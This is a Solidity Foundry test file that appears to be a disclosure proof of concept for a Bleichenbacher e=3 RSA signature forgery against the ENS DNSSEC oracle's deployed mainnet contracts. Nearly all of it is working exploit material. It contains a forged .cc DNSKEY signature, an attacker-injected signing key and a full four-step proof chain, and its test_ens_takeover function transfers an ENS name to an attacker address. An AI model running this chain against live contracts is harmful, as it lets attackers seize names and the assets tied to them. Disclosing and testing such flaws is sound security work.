// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "forge-std/Test.sol";

interface IAlgorithm {
    function verify(bytes calldata key, bytes calldata data, bytes calldata sig)
        external view returns (bool);
}

interface IDNSSEC {
    struct RRSetWithSignature { bytes rrset; bytes sig; }
    function verifyRRSet(RRSetWithSignature[] memory input, uint256 now)
        external view returns (bytes memory rrs, uint32 inception);
}

interface IDNSRegistrar {
    function proveAndClaim(bytes memory name, IDNSSEC.RRSetWithSignature[] memory input) external;
}

interface IENS {
    function owner(bytes32 node) external view returns (address);
}

/// @title  ENS DNSSEC Oracle — Bleichenbacher e=3 Signature Forgery PoC
/// @notice Full 4-step chain using real root zone data. No vm.store().
///         Only vm.warp() is used to set block.timestamp within the RRSIG
///         validity window (real signatures expire).
contract PoC is Test {

    // ── Mainnet contracts ───────────────────────────────────────────
    address constant RSASHA256_ALGO = 0x9D1B5a639597f558bC37Cf81813724076c5C1e96;
    address constant DNSSEC_IMPL    = 0x0fc3152971714E5ed7723FAFa650F86A4BaF30C5;
    address constant DNS_REGISTRAR  = 0xB32cB5677a7C971689228EC835800432B339bA2B;
    address constant ENS_REGISTRY   = 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e;

    // ── Step 0: Root DNSKEY RRset (real, signed by root KSK 20326) ──
    bytes constant STEP0_RRSET = hex"003008000002a3006998f580697d46004f660000003000010002a30001080100030803010001b353542dbea6bcb8a5cdfba5923d3a3e9bf051f14f7546aef48f28b1354e3c9f7b6914654b555f9c6bbfa015e0154efb282b62319930d8049db2d4e339279e59e12367b483a893cdad5a661d1d4595c61f5e82d4d50dab50b10645212184214037883ad2da731f919854dcfa1487249d8c27bf484b4d2403b78a8ba9a87d0ed23c999d2558c8f89031efdd72d1fe50681fa21c600d539dc5c226173544237c0cc2aed39a49ebc6b31f123bc0536972c08c5ab979ec0eb7049c5707d50e111796fa44e9efa622773084d29a3110fd20fb8710da8234f239323c5f00c552e9c118f1e128cc892ffef1dcfb402ebb79fe15cc7a17626ce0a3d76871128405ee81f500003000010002a30001080101030803010001acffb409bcc939f831f7a1e5ec88f7a59255ec53040be432027390a4ce896d6f9086f3c5e177fbfe118163aaec7af1462c47945944c4e2c026be5e98bbcded25978272e1e3e079c5094d573f0e83c92f02b32d3513b1550b826929c80dd0f92cac966d17769fd5867b647c3f38029abdc48152eb8f207159ecc5d232c7c1537c79f4b7ac28ff11682f21681bf6d6aba555032bf6f9f036beb2aaa5b3778d6eebfba6bf9ea191be4ab0caea759e2f773a1f9029c73ecb8d5735b9321db085f1b8e2d8038fe2941992548cee0d67dd4547e11dd63af9c9fc1c5466fb684cf009d7197c2cf79e792ab501e6a8a1ca519af2cb9b5f6367e94c0d47502451357be1b500003000010002a30001080101030803010001af7a8deba49d995a792aefc80263e991efdbc86138a931deb2c65d5682eab5d3b03738e3dfdc89d96da64c86c0224d9ce02514d285da3068b19054e5e787b2969058e98e12566c8c808c40c0b769e1db1a24a1bd9b31e303184a31fc7bb56b85bbba8abc02cd5040a444a36d47695969849e16ad856bb58e8fac8855224400319bdab224d83fc0e66aab32ff74bfeaf0f91c454e6850a1295207bbd4cdde8f6ffb08faa9755c2e3284efa01f99393e18786cb132f1e66ebc6517318e1ce8a3b7337ebb54d035ab57d9706ecd9350d4afacd825e43c8668eece89819caf6817af62dc4fbd82f0e33f6647b2b6bda175f14607f59f4635451e6b27df282ef73d87";
    bytes constant STEP0_SIG   = hex"50bac3d9997e9cf36eb44da9cddad1c85fad6220eeaec9ccc78260b50b57c4d34b5d66184eeb97fbd40bd756ecdb002aa9031e030d88ebf58aa71addd1b4c12e464cfb0a44e7b9975484a8f8acb20185af405f4150c599f1d4ed471b07b0ce682a186cb581a8a1a50b8dcba8aebb72ec2b1f4f724921ad4f05a2bbf4bd26504455271f6db103db0c5dc233edbd226bccc6cdf3e8f37c777bdb236b6f6d1d4bdb6dbf0b2b929b52407dc91ed6c29b3b35a8d7e44be995019be71834897eed343cd0d6e7583987c8d6a627f81eb845af1c6d113447452f563c7ef2072360421e1b7e86755a4effacfd602347fc54df087698c0477b89bd7cd7273a6a1d912939b5";

    // ── Step 1: .cc DS RRset (real, signed by root ZSK 21831) ───────
    bytes constant STEP1_RRSET = hex"002b0801000151806995f0106984be8055470002636300002b000100015180002402070802e1ec6495abd34562e6f433dee201e6c6a52cb10af69c04d675da692d2d566897";
    bytes constant STEP1_SIG   = hex"96b3821fae2501a38beba05675d2e1613b0974d64cb6951f312e1b31e66128acd6934f0f9e6f00ce9073814d7f91aa7a9d2f6818c554ae2b7f33c8d68ef4ec92cacbfab1234ac6b83a6e36cfb099ce31d7961be5dee7012ff50b09f47cdfe9650767e45085c512d2ee3a89f6262e4c21dbf5c6e0e853fdc63927bd0004686f9521f6d588281e1adcf00a44b633cf795483a5ef45664de599f147a1e276f2be6788e6974be74c97193650db34360f4826812ebf41b5ad827cb0d3eeb1a157e7569f639ca390cb528f39894b81fe945116fea66b4cd80f534fb843f57861defa1dfb6f72e33d93b17a84f75f120b9ddefb1bea6e8d7add9b54e2c8ae2adae1ead7";

    // ── Step 2: .cc DNSKEY RRset (FORGED via Bleichenbacher e=3) ────
    //    Contains real .cc KSK + attacker-injected ZSK.
    //    Signature forged: S^3 < N, trailing 32 bytes = sha256(rrset).
    bytes constant STEP2_RRSET = hex"00300801000151806995f0106984be8102070263630002636300003000010001518001080100030803010001ead8d1fc5adb27f08f3402852271c8dac687baeb02a66fd75c8ce7edba7a74ebf8ce5d3fd841d41c07afdcd0441dc7d66c39ffa4b92559a6d1257a944d0ea04b4e18ad64adac1577528d4f3ca23a52d4e81e35a7a4e84e2508339258d9312a3fa142d9a7e2d99725379a50aad0c6d8b6013aa8317a0328874df47beae92ad4f915fa7eaded1498809f6da521d922d3292a16a9c2d6f724242fb38e117efcf8d8ceccd12591637776e8bd1b35835abe3490de31a88ca27ae784791776310d4c93b9a490f6abde45fab6236155a7e13bd8b273ec6b4620db6f10a9babbaf338195dec7a6d5b1b9f603f74e2881ee0723dd1e624ec34ea06f18543b882d1a7322b70263630000300001000151800106010103080103e97b1c85abf704ec6f8a87557db65ee771c1f0487dca469b26e91aa3dcb1dd2352e1699a6a7e5ff283d7a5718fc8d06de8ec273e055dd1a45a526574add45087eff826f151bd7a2e50c50a0272b84857f1080f35bc13ea15284fff16d08ff569d9eda9b827eb44ae774823e9ad25da69b806235e4eee6f4b6059f79b977ccb1f0652c52209e19580103bf35789ef054d40c5d3700589da7161aa337f11121e67b133a4cac5f74ee1fd548cf9953ddc68cac55f28aaf1a2c15e8f4a6267f04ecff0af6aad76f0f7805aaca4edb6ac3c8414fb2b6480c142d071fe12451c0cef85a406b37cc7f95ceed61ae38bd19912f642e1d861ccc125d7c6510e939e6ec699";
    bytes constant STEP2_SIG   = hex"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009040da7531350a438c81cc2759542820cdd619bf779f0ddd42243abd01aeaabf";

    // ── Step 3: _ens.test.cc TXT (signed by attacker ZSK) ──────────
    bytes constant STEP3_RRSET = hex"00100803000151806995f0106984be814e7002636300045f656e730474657374026363000010000100015180002d2c613d307844656144626565666445416462656566644561646245454664656164626545466445614462656546";
    bytes constant STEP3_SIG   = hex"76e5ae634439760e006ca7f1ea2e535073d18bc3f117d9093e9597247c52257d98fc11649c209f5c02276666241bd453cce617e0552be4c0cae530ac21fd86408e3e98176a172da90dd4485683e3cb2dfa874016fe61e90d445f052cd7f0b0303a2715fdb9c0146f177b1b1f369c904bfcbd66882e354116ad5e9f9a54219b806277a77b0a2c7af6780725d140703b7b7edd47cae7a03846212df4575ac7486d8cf998f2e2c0b62bec402e05ddbe2074f521824febf304bee508b86c60e963bd8ca6098acc37c3cc5528b06effbbcc460831efa8ee7c41c6a953814d8218eaa9d5af7ccb66e07b7ef6afa0553cafc0eb20bb554f1c5db23e730d8c1f3e483d7c";

    // ── Target ──────────────────────────────────────────────────────
    bytes constant KSK_RDATA       = hex"010103080103e97b1c85abf704ec6f8a87557db65ee771c1f0487dca469b26e91aa3dcb1dd2352e1699a6a7e5ff283d7a5718fc8d06de8ec273e055dd1a45a526574add45087eff826f151bd7a2e50c50a0272b84857f1080f35bc13ea15284fff16d08ff569d9eda9b827eb44ae774823e9ad25da69b806235e4eee6f4b6059f79b977ccb1f0652c52209e19580103bf35789ef054d40c5d3700589da7161aa337f11121e67b133a4cac5f74ee1fd548cf9953ddc68cac55f28aaf1a2c15e8f4a6267f04ecff0af6aad76f0f7805aaca4edb6ac3c8414fb2b6480c142d071fe12451c0cef85a406b37cc7f95ceed61ae38bd19912f642e1d861ccc125d7c6510e939e6ec699";
    bytes constant TARGET_NAME     = hex"047465737402636300";
    address constant ATTACKER      = 0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF;
    bytes32 constant TARGET_NAMEHASH = 0xbafffdf57e1fb3a6a5d9e5c5366533a4b8dcfcdb15d3a2d773de797bbfa7f7d4;

    function setUp() public {
        require(DNSSEC_IMPL.code.length > 0, "not on mainnet fork");
        // Warp into the validity window shared by all 4 RRSIGs.
        vm.warp(1770870600);
    }

    /// @notice Forged signature passes deployed RSASHA256Algorithm.verify().
    function test_forged_sig_accepted() public {
        assertTrue(IAlgorithm(RSASHA256_ALGO).verify(KSK_RDATA, STEP2_RRSET, STEP2_SIG));
    }

    /// @notice Control: random signature rejected.
    function test_random_sig_rejected() public {
        bytes memory badSig = new bytes(256);
        badSig[255] = 0x01;
        assertFalse(IAlgorithm(RSASHA256_ALGO).verify(KSK_RDATA, STEP2_RRSET, badSig));
    }

    /// @notice Full chain: 4-step forged proof -> proveAndClaim -> ENS takeover.
    ///         Uses real root zone signatures. No storage manipulation.
    function test_ens_takeover() public {
        assertTrue(IENS(ENS_REGISTRY).owner(TARGET_NAMEHASH) != ATTACKER);

        IDNSSEC.RRSetWithSignature[] memory input = new IDNSSEC.RRSetWithSignature[](4);
        input[0] = IDNSSEC.RRSetWithSignature(STEP0_RRSET, STEP0_SIG);  // root DNSKEY
        input[1] = IDNSSEC.RRSetWithSignature(STEP1_RRSET, STEP1_SIG);  // .cc DS
        input[2] = IDNSSEC.RRSetWithSignature(STEP2_RRSET, STEP2_SIG);  // .cc DNSKEY [FORGED]
        input[3] = IDNSSEC.RRSetWithSignature(STEP3_RRSET, STEP3_SIG);  // TXT record

        IDNSRegistrar(DNS_REGISTRAR).proveAndClaim(TARGET_NAME, input);

        assertEq(IENS(ENS_REGISTRY).owner(TARGET_NAMEHASH), ATTACKER);
    }
}
